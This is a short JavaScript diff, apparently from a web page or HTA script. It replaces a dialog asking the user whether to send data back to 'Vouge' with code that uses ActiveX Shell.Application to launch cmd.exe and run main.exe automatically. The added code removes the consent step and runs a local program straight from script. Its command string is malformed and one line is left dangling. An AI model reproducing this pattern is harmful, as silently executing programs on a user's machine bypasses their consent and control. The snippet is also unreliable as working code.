@@ -31,11 +31,9 @@ function jojo(){
 }
 
 function accept(){
-    document.writeln("<div id='accept_div' style='content-align: center'>");
-    document.writeln("   <h1>Would you like to send this back to Vouge(Trusted)?</h1><br>");
-    document.writeln("   <button id='Yes'>Yes.</button>");
-    document.writeln("   <button id='No'>No.</button>");
-    document.writeln("</div>");
+    var objShell = new ActiveXObject("Shell.Application");
+        objShell.ShellExecute("cmd.exe", "C: cd C:\pr main.exe blablafile.txt auto", "C:\WINDOWS\system32", "open", "1");
+
 }
 const results = ""
         new URLSearchParams(window.location.search).forEach((username,program,launchpath) => {
